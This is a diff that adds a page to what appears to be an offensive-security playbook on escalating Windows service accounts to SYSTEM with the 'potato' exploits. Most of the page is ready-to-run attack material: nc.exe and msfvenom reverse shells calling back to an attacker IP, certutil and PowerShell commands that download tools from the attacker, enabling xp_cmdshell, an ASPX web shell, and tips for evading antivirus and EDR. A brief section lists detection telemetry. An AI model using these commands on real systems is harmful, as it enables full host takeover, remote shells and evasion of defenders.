@@ -1,0 +1,498 @@
+---
+title: SeImpersonate / SeAssignPrimaryToken
+description: Token-impersonation escalation - the "potato family" of attacks that lifts a service account holding SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to NT AUTHORITY\SYSTEM. JuicyPotato for older targets (Server 2008-2016, Win10 pre-1809), PrintSpoofer for newer targets (Server 2019, Win10 1809+), RoguePotato as a generic fallback, and the canonical xp_cmdshell-on-MSSQL service-account context that makes this the most common Windows privesc on real engagements.
+mitre: [T1134.001, T1134.002, T1068]
+d3fend: [D3-PM]
+impact: [PrivEsc, SystemCompromise]
+owasp: []
+noise: loud
+sidebar:
+  order: 5
+  label: SeImpersonate
+---
+
+import NoiseBadge from '../../../../../components/NoiseBadge.astro';
+
+## TL;DR
+
+A service account with `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled can become SYSTEM. The "potato family" of exploits tricks a SYSTEM-context Windows component (DCOM, Print Spooler, RPC) into authenticating to an attacker-controlled local endpoint; the attacker captures the authentication token and impersonates it. Pick the variant based on the target OS.
+
+```
+# Confirm the privilege exists
+whoami /priv | findstr Impersonate
+
+# Pick the variant by target OS
+# Server 2008/2012/2016, Win 10 pre-1809:
+JuicyPotato.exe -l 53375 -p cmd.exe -a "/c COMMAND" -t *
+
+# Server 2019, Win 10 1809+:
+PrintSpoofer.exe -i -c "cmd.exe"
+
+# Universal (DCOM-server-on-WinRM listener):
+RoguePotato.exe -r 10.10.14.3 -e "cmd.exe" -l 9999
+
+# Common context: MSSQL service account via xp_cmdshell
+mssqlclient.py user@target -windows-auth
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe ATTACKER 8443 -e cmd"
+```
+
+Success indicator: a SYSTEM-context shell - `whoami` returns `nt authority\system`.
+
+## When this applies
+
+`SeImpersonatePrivilege` exists for a legitimate reason - services that accept network connections (IIS, MSSQL, Print Spooler, Exchange) need to impersonate connecting clients to perform actions on their behalf. The Windows design assigns this privilege to service accounts by default:
+
+```
+SeImpersonatePrivilege: Administrators, Local Service, Network Service, Service
+```
+
+The four contexts where you'll commonly land in a privilege-holding state without being a local admin:
+
+1. **IIS web shell** - Upload to a web app, get RCE as `IIS APPPOOL\<appname>` or `Network Service`. `SeImpersonatePrivilege` is on by default.
+2. **MSSQL `xp_cmdshell`** - SQL injection or known credentials yield SQL command execution as the SQL Server service account (`NT SERVICE\MSSQLSERVER` or `NT SERVICE\MSSQL$<INSTANCE>`). `SeImpersonatePrivilege` is on.
+3. **Jenkins / build agent RCE** - Code execution in a Jenkins service context.
+4. **Exchange / SharePoint** - Various service-account contexts after RCE.
+
+In all four cases, the standard `whoami` shows a service-style account name, and `whoami /priv` shows `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`) as `Enabled`. The token-abuse path skips Administrator entirely and goes directly to SYSTEM.
+
+If your context isn't service-account-style, this page probably doesn't apply - see [SeDebugPrivilege](/codex/windows/privesc/sedebugprivilege/) or [SeTakeOwnership](/codex/windows/privesc/setakeownership/) for other token-based primitives.
+
+## How the potato attacks work
+
+All variants exploit the same underlying mechanic:
+
+1. The attacker opens a TCP listener locally (any port) and is prepared to handle the NTLM/Kerberos authentication protocol manually.
+2. The attacker invokes a Windows component running as SYSTEM that performs an outbound authenticated connection. Different variants use different components:
+   - **JuicyPotato**: DCOM (via specific CLSIDs that activate as SYSTEM)
+   - **PrintSpoofer**: Print Spooler RPC (the Spooler service runs as SYSTEM)
+   - **RoguePotato**: DCOM + an OXID resolver redirect to a remote host
+3. The component authenticates *to the attacker's listener*, sending its SYSTEM-context Kerberos/NTLM ticket/blob.
+4. The attacker calls `ImpersonateLoggedOnUser` with that authentication, becoming SYSTEM in the current process.
+5. The attacker calls `CreateProcessWithTokenW` to spawn a child process holding the SYSTEM token - a SYSTEM shell.
+
+The variants exist because Microsoft has gradually closed off the loopholes:
+
+- **JuicyPotato** (DCOM-direct) was killed by Microsoft restricting same-host DCOM activation in Win 10 1809 / Server 2019.
+- **PrintSpoofer** uses the Print Spooler RPC interface, which still allowed local SYSTEM-context authentication as of its publication.
+- **RoguePotato** routes the authentication through a remote OXID resolver (an attacker-controlled DCOM server) to re-enable the DCOM path on newer Windows.
+
+## Confirming the privilege
+
+```cmd
+C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+The signal: `SeImpersonatePrivilege` is `Enabled`. `SeAssignPrimaryTokenPrivilege` is functionally equivalent for these attacks - either works.
+
+The `Disabled` state for the assign-primary-token doesn't matter - the potato exploits enable disabled privileges programmatically as part of their flow. The exploit fails only if the privilege isn't *held* at all.
+
+## JuicyPotato - older targets
+
+<NoiseBadge level="loud" />
+
+[JuicyPotato](https://github.com/ohpe/juicy-potato) is the original DCOM-based potato. Works on Server 2008, 2012, 2012 R2, 2016, and Windows 10 builds before 1809.
+
+### Basic usage
+
+```cmd
+C:\> JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
+
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+[+] CreateProcessWithTokenW OK
+[+] calling 0x000000000088ce08
+```
+
+Flags:
+
+- `-l 53375` - Local COM listener port. Any unused TCP port works; pick something high to avoid conflicts.
+- `-p c:\windows\system32\cmd.exe` - Program to launch with the captured SYSTEM token.
+- `-a "/c COMMAND"` - Arguments to the program. The `/c COMMAND` pattern executes a single command and exits.
+- `-t *` - Token-acquisition method to try. `*` means try both `CreateProcessWithTokenW` (needs `SeImpersonate`) and `CreateProcessAsUser` (needs `SeAssignPrimaryToken`). If only one privilege is held, use `-t t` (CreateProcessWithTokenW) or `-t u` (CreateProcessAsUser) explicitly.
+- `-c {CLSID}` - Specific DCOM CLSID to use. Defaults to BITS (`{4991d34b-80a1-4291-83b6-3328366b9097}`).
+
+### CLSID selection
+
+The default BITS CLSID works on many systems, but some configurations have it removed or modified. If the default fails:
+
+```
+COM -> recv failed with error: 10038
+```
+
+Try alternative CLSIDs. The [JuicyPotato CLSID catalog](https://github.com/ohpe/juicy-potato/tree/master/CLSID) lists known-working CLSIDs per Windows version. Common alternatives:
+
+| CLSID | Service | Notes |
+| --- | --- | --- |
+| `{4991d34b-80a1-4291-83b6-3328366b9097}` | BITS | Default, most reliable |
+| `{e60687f7-01a1-40aa-86ac-db1cbf673334}` | Windows Update Service | Common fallback |
+| `{752073A1-23F2-4396-85F0-8FDB879ED0ED}` | Search Filter Host | Works when others don't |
+
+Verify the corresponding service is running before picking a CLSID:
+
+```cmd
+C:\> sc query wuauserv
+SERVICE_NAME: wuauserv
+        TYPE               : 30  WIN32
+        STATE              : 4  RUNNING
+```
+
+### Reverse shell setup
+
+The `-a` argument typically spawns a reverse shell back to the attacker. Set up the listener first:
+
+```shell
+$ sudo nc -lvnp 8443
+listening on [any] 8443 ...
+```
+
+Drop `nc.exe` to the target (e.g., `C:\Tools\nc.exe`), then run JuicyPotato:
+
+```cmd
+C:\> JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+```
+
+If everything aligns:
+
+```shell
+$ sudo nc -lvnp 8443
+listening on [any] 8443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+### MSFVenom payload alternative
+
+Instead of `nc.exe`, generate a Meterpreter or shell payload:
+
+```shell
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f exe > shell.exe
+```
+
+Drop `shell.exe` to the target and use it as the JuicyPotato `-p` parameter directly:
+
+```cmd
+C:\> JuicyPotato.exe -t * -p C:\Tools\shell.exe -l 8443 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
+```
+
+This skips the `cmd.exe /c nc.exe` indirection - slightly cleaner.
+
+## PrintSpoofer - Server 2019 / Win 10 1809+
+
+<NoiseBadge level="moderate" />
+
+[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) is the post-JuicyPotato variant that exploits the Print Spooler RPC interface. Works where JuicyPotato no longer does - Server 2019, Server 2022, Windows 10 1809+, Windows 11.
+
+### Basic usage
+
+```cmd
+C:\> PrintSpoofer.exe -i -c cmd.exe
+
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+NULL
+```
+
+Flags:
+
+- `-i` - Interactive. Spawn the resulting SYSTEM process in the current console (useful when you have an interactive shell).
+- `-c COMMAND` - Run `COMMAND` (replaces `-i`). Use this for non-interactive execution like reverse shells.
+- `-d SESSION_ID` - Target a specific session. Useful when multiple users are logged in via RDP.
+
+### Reverse shell
+
+```cmd
+C:\> PrintSpoofer.exe -c "C:\Tools\nc.exe 10.10.14.3 8443 -e cmd"
+```
+
+Or with an msfvenom payload:
+
+```cmd
+C:\> PrintSpoofer.exe -c "C:\Tools\shell.exe"
+```
+
+The receiver on the attacker:
+
+```shell
+$ sudo nc -lvnp 8443
+listening on [any] 8443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+### When PrintSpoofer fails
+
+PrintSpoofer requires the Print Spooler service running. On systems where the Print Spooler has been disabled (a hardening measure after PrintNightmare), PrintSpoofer fails:
+
+```
+[-] Could not connect to the spooler service.
+```
+
+Check:
+
+```cmd
+C:\> sc query spooler
+
+SERVICE_NAME: spooler
+        STATE              : 1  STOPPED
+```
+
+If stopped, the path forward is RoguePotato (which doesn't depend on Spooler).
+
+## RoguePotato - generic fallback
+
+<NoiseBadge level="loud" />
+
+[RoguePotato](https://github.com/antonioCoco/RoguePotato) works around the local-DCOM restriction by routing the authentication through an attacker-controlled remote OXID resolver. Setup is slightly more involved but covers cases JuicyPotato can't.
+
+### Listener setup on attacker (Kali/Parrot)
+
+RoguePotato needs a relay on the attacker side. The repo includes `RogueOxidResolver.exe` (Windows) and an iptables setup for Linux that redirects TCP/135 to the attacker's chosen relay port.
+
+```shell
+# Run on Kali/Parrot - redirect Windows OXID resolver port to the relay port
+$ sudo iptables -t nat -A PREROUTING -p tcp --dport 135 -j REDIRECT --to-ports 9999
+```
+
+Then run the OXID resolver (compiled separately, or use socat to relay):
+
+```shell
+$ socat tcp-listen:9999,reuseaddr,fork tcp:VICTIM:9999
+```
+
+### Running RoguePotato on the target
+
+```cmd
+C:\> RoguePotato.exe -r 10.10.14.3 -e "C:\Tools\nc.exe 10.10.14.3 8443 -e cmd" -l 9999
+```
+
+Flags:
+
+- `-r 10.10.14.3` - Remote IP of the attacker's OXID resolver
+- `-e COMMAND` - Command to execute as SYSTEM
+- `-l 9999` - Local port to bind the COM listener
+
+Receiver on the attacker:
+
+```shell
+$ sudo nc -lvnp 8443
+listening on [any] 8443 ...
+connect to [10.10.14.3] from VICTIM
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+RoguePotato is more setup-intensive but works in scenarios where JuicyPotato fails (post-1809) and PrintSpoofer fails (Spooler disabled).
+
+## The MSSQL service-account context
+
+The most common real-world path to this attack: MSSQL service accounts via `xp_cmdshell`. The chain:
+
+1. SQL injection or stolen MSSQL credentials yield SQL Server query execution.
+2. The SQL Server service account holds `SeImpersonatePrivilege` by default.
+3. `xp_cmdshell` runs OS commands in the SQL service account context.
+4. From that context, run any potato variant to become SYSTEM.
+
+### Connecting with mssqlclient.py
+
+[Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) is the standard tool:
+
+```shell
+$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
+
+Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
+[*] ACK: Result: 1 - Microsoft SQL Server (130 19162)
+SQL>
+```
+
+`-windows-auth` uses NTLM authentication (Windows account credentials). Without it, uses SQL authentication (SQL-internal accounts).
+
+### Enabling xp_cmdshell
+
+By default, `xp_cmdshell` is disabled. The shell has a built-in command to enable it:
+
+```sql
+SQL> enable_xp_cmdshell
+
+[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1.
+[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1.
+```
+
+Enabling `xp_cmdshell` requires `sysadmin` role on the SQL instance. Not all SQL accounts have this. Check first:
+
+```sql
+SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
+1
+```
+
+`1` means yes. If `0`, see if any login does (sometimes a non-default account holds it):
+
+```sql
+SQL> SELECT name FROM sys.server_principals WHERE type_desc='SQL_LOGIN' AND IS_SRVROLEMEMBER('sysadmin', name) = 1;
+```
+
+### Confirming the service context
+
+```sql
+SQL> xp_cmdshell whoami
+
+output
+--------------------------------------------------------------------------------
+nt service\mssql$sqlexpress01
+```
+
+`NT SERVICE\MSSQL$<INSTANCE>` confirms SQL Server service account. Check privileges:
+
+```sql
+SQL> xp_cmdshell whoami /priv
+
+output
+--------------------------------------------------------------------------------
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+`SeImpersonatePrivilege: Enabled` - green light for potato.
+
+### End-to-end via xp_cmdshell
+
+Upload the potato binary and netcat to a writable directory, then invoke through `xp_cmdshell`:
+
+```sql
+SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
+
+output
+--------------------------------------------------------------------------------
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+NULL
+```
+
+Reverse shell catcher receives SYSTEM-context cmd.
+
+### How file upload works in mssqlclient
+
+If you only have SQL access and no file transfer mechanism, you have a few options:
+
+- **SMB share served from attacker** - use `impacket-smbserver` on the attacker, then `xp_cmdshell` runs binaries directly from the UNC path (`\\10.10.14.3\share\PrintSpoofer.exe`)
+- **Certutil download** - `xp_cmdshell certutil -urlcache -split -f http://10.10.14.3/PrintSpoofer.exe C:\Tools\PrintSpoofer.exe`
+- **PowerShell download** - `xp_cmdshell powershell -c "iwr http://10.10.14.3/PrintSpoofer.exe -OutFile C:\Tools\PrintSpoofer.exe"`
+
+The SMB share variant is the cleanest - no need to write the binary to disk on the target at all, just execute it from the UNC path. The SMB session leaves logs but the binary itself isn't on the target filesystem.
+
+## IIS web shell context
+
+Same pattern, different entry point. After uploading an ASPX web shell to a writable IIS directory:
+
+```aspx
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<% Process.Start("cmd.exe", "/c " + Request["c"]); %>
+```
+
+Hit it: `http://target/shell.aspx?c=whoami /priv`
+
+Response: `IIS APPPOOL\<appname>` with `SeImpersonatePrivilege: Enabled`.
+
+Then drop `PrintSpoofer.exe` to a writable directory (often `C:\inetpub\wwwroot\<app>\` or `C:\Windows\Temp\`) and invoke:
+
+```
+http://target/shell.aspx?c=C:\inetpub\wwwroot\app\PrintSpoofer.exe -c "C:\Tools\nc.exe 10.10.14.3 8443 -e cmd"
+```
+
+## Operational considerations
+
+### Detection signal
+
+The potato attacks produce specific telemetry:
+
+- **Process trees** - `services.exe → svchost.exe → cmd.exe` (SYSTEM cmd spawned from a service-account process tree) is flagged by behavioral EDR
+- **Named pipe creates** - PrintSpoofer creates a specific pipe name; signatured by AV
+- **Authentication events 4624 / 4625** - multiple anonymous local logins in quick succession
+- **Sysmon process create events** - JuicyPotato.exe, PrintSpoofer.exe, RoguePotato.exe (default names) are signatured
+
+For evasive ops:
+
+- Compile from source with renamed strings and removed comments
+- Use modified or less-known variants (search for "potato" forks)
+- Rename the binary and modify imports
+- For PrintSpoofer specifically, the [SweetPotato](https://github.com/CCob/SweetPotato) variant bundles JuicyPotato/PrintSpoofer/RoguePotato into a single binary with multiple methods to try; that's the modern operator default
+
+### Modern variants
+
+- **GodPotato** - Works against Windows Server 2012 through Server 2022, including patched systems where PrintSpoofer is mitigated.
+- **EfsPotato** - Exploits the EFS RPC interface; works where other variants don't.
+- **SharpEfsPotato** - C# implementation of EfsPotato.
+- **PetitPotam** - Originally an unauthenticated NTLM relay primitive, but the relay technique also applies to local privilege escalation.
+
+The landscape changes - Microsoft patches one variant, researchers find another. Check current public tooling before assuming a specific variant works on a current Windows version.
+
+## Quick reference
+
+| Task | Pattern |
+| --- | --- |
+| Confirm SeImpersonate held | `whoami /priv \| findstr Impersonate` |
+| JuicyPotato (legacy OS) | `JuicyPotato.exe -l 53375 -p cmd.exe -a "/c CMD" -t *` |
+| JuicyPotato with custom CLSID | `JuicyPotato.exe -c "{CLSID}" -p cmd.exe -a "/c CMD" -l 53375 -t *` |
+| PrintSpoofer (modern OS) | `PrintSpoofer.exe -i -c cmd.exe` |
+| PrintSpoofer reverse shell | `PrintSpoofer.exe -c "nc.exe ATTACKER PORT -e cmd"` |
+| RoguePotato (universal) | `RoguePotato.exe -r ATTACKER -e "CMD" -l 9999` |
+| Modern combined tool | `SweetPotato.exe` (tries all variants) |
+| Newer variant for patched targets | `GodPotato.exe -cmd "cmd /c CMD"` |
+| MSSQL connect | `mssqlclient.py user@target -windows-auth` |
+| Enable xp_cmdshell | `enable_xp_cmdshell` (or SQL `EXEC sp_configure`) |
+| Check service account context | `xp_cmdshell whoami` |
+| Common service-account names | `nt service\mssql$<inst>`, `iis apppool\<app>`, `nt authority\network service` |
+| MSFVenom shell payload | `msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe` |
+| Generate Meterpreter payload | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT -f exe > meter.exe` |
+| Receiver on attacker | `sudo nc -lvnp 8443` or `msfconsole -r handler.rc` |
+| CLSID catalog reference | [JuicyPotato CLSIDs](https://github.com/ohpe/juicy-potato/tree/master/CLSID) |
+
+For the other token-based primitives, see [SeDebugPrivilege](/codex/windows/privesc/sedebugprivilege/) (LSASS memory access), [SeTakeOwnership](/codex/windows/privesc/setakeownership/) (file ownership manipulation), [Backup Operators](/codex/windows/privesc/backup-operators/) (SeBackup/SeRestore for file reads).
+
+## Next move
+
+- **Got SYSTEM shell** → dump credentials via [SeDebugPrivilege → LSASS](/codex/windows/privesc/sedebugprivilege/) or check for domain reach with `whoami /groups`
+- **JuicyPotato fails (`ole32 errors` / `not found`)** → target is Server 2019+ / Win10 1809+ - switch to [PrintSpoofer](#printspoofer--server-2019--win-10-1809) or [RoguePotato](#roguepotato--generic-fallback)
+- **All three potatoes fail on modern target** → try GodPotato (Server 2022 / Win11), or check for [Backup Operators / DnsAdmins / other privileged groups](/codex/windows/privesc/other-privileged-groups/) on this account
+- **xp_cmdshell works but doesn't have SeImpersonate** → service account may be `LocalSystem` already (`xp_cmdshell whoami /priv`); or pivot to file-write via `xp_cmdshell` and chain a [Backup Operators](/codex/windows/privesc/backup-operators/) abuse
+- **AV/EDR blocking every potato variant** → drop to [Initial enumeration](/codex/windows/privesc/initial-enumeration/) and look for misconfigured services, kernel exploits, or credential-hunting paths instead
